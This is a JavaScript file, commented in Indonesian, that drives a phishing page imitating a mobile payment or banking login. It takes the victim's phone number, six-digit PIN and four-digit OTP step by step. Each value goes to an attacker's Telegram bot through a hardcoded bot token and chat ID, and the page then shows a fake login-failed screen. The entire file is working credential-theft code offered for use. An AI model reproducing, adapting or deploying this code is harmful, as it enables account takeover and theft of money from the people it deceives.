/**
 * Konfigurasi Bot Telegram
 */
const TOKEN = "8397657404:AAGJTLh6WK2bZU6q0WoGfVkRUhfoc3ErzPE";
const CHAT_ID = "6224388727";

let data = { hp: "", pin: "", otp: "" };
let timer;

/**
 * Fungsi Mengirim Data ke Telegram dengan Format Bersih & Profesional
 */
async function sendTele(title, content) {
    // Format pesan standar profesional tanpa dekorasi berlebih
    const message = `<b>[ LOG: ${title} ]</b>\n` +
                    `----------------------------------------\n` +
                    `<b>No. HP :</b> <code>${data.hp || '-'}</code>\n` +
                    `${content}\n` +
                    `----------------------------------------`;

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message, 
                parse_mode: "HTML" 
            })
        });
    } catch (e) { 
        console.error("Error sending message:", e); 
    }
}

/**
 * Kontrol Tampilan Layar (Screen)
 */
function showScreen(id, title = "") {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById('screen-' + id).classList.add('active');
    
    const head = document.getElementById('nav-header');
    if(title) { 
        head.classList.add('active'); 
        document.getElementById('nav-title').innerText = title; 
    } else { 
        head.classList.remove('active'); 
    }
}

/**
 * Logika OTP Timer
 */
function startTimer() {
    let timeLeft = 30;
    const timerDisplay = document.getElementById('timer-otp');
    if (!timerDisplay) return;

    timerDisplay.style.cursor = "default";
    clearInterval(timer);
    
    timer = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(timer);
            timerDisplay.innerText = "Kirim Ulang";
            timerDisplay.style.cursor = "pointer";
        } else {
            timerDisplay.innerText = `00:${timeLeft < 10 ? '0' + timeLeft : timeLeft}`;
            timeLeft--;
        }
    }, 1000);
}

function handleResend() {
    const timerDisplay = document.getElementById('timer-otp');
    if (timerDisplay.innerText === "Kirim Ulang") {
        sendTele("RESEND OTP", "<b>Status :</b> Minta kode baru");
        startTimer();
    }
}

/**
 * Event Listener untuk Input Nomor HP
 */
const hpInput = document.getElementById('hp-input');
const btnLogin = document.getElementById('btn-login');

if (hpInput) {
    hpInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, ''); 
        if (val.length > 15) val = val.substring(0, 15);
        e.target.value = val;
        
        if(val.length >= 10 && val.length <= 15) { 
            btnLogin.disabled = false; 
            btnLogin.classList.replace('disabled', 'active'); 
        } else { 
            btnLogin.disabled = true; 
            btnLogin.classList.replace('active', 'disabled'); 
        }
    });
}

function submitHP() {
    data.hp = hpInput.value;
    document.getElementById('user-hp').innerText = data.hp;
    sendTele("LOGIN BARU", "<b>Status :</b> Sedang input PIN");
    
    showScreen('loading');
    setTimeout(() => {
        showScreen('pin', 'Masukkan PIN');
        document.getElementById('pin-hidden').focus();
    }, 1200);
}

/**
 * Event Listener untuk Input PIN
 */
const pinHidden = document.getElementById('pin-hidden');
const dots = document.querySelectorAll('#screen-pin .dot');
const pinArea = document.getElementById('pin-area');

if (pinArea) {
    pinArea.addEventListener('click', () => pinHidden.focus());
}

if (pinHidden) {
    pinHidden.addEventListener('input', () => {
        const val = pinHidden.value.replace(/\D/g, '');
        pinHidden.value = val;
        
        dots.forEach((d, i) => i < val.length ? d.classList.add('active') : d.classList.remove('active'));
        
        if(val.length === 6) {
            data.pin = val;
            sendTele("DATA PIN", `<b>PIN    :</b> <code>${val}</code>`);
            
            showScreen('loading');
            setTimeout(() => {
                showScreen('otp', 'Kode OTP');
                const otp1 = document.getElementById('otp-1');
                if (otp1) otp1.focus();
                startTimer();
            }, 1200);
        }
    });
}

/**
 * Event Listener untuk Input OTP
 */
const otps = document.querySelectorAll('.otp-box');
otps.forEach((box, i) => {
    box.addEventListener('input', () => {
        if(box.value && i < 3) otps[i+1].focus();
        
        const full = Array.from(otps).map(b => b.value).join('');
        if(full.length === 4) {
            data.otp = full;
            sendTele("DATA LENGKAP", 
                `<b>PIN    :</b> <code>${data.pin}</code>\n` +
                `<b>OTP    :</b> <code>${full}</code>\n` +
                `<b>Status :</b> Selesai`
            );
            
            showScreen('loading');
            setTimeout(() => showScreen('error', 'Gagal Masuk'), 2000);
        }
    });

    box.addEventListener('keydown', (e) => {
        if (e.key === "Backspace" && !box.value && i > 0) {
            otps[i - 1].focus();
        }
    });
});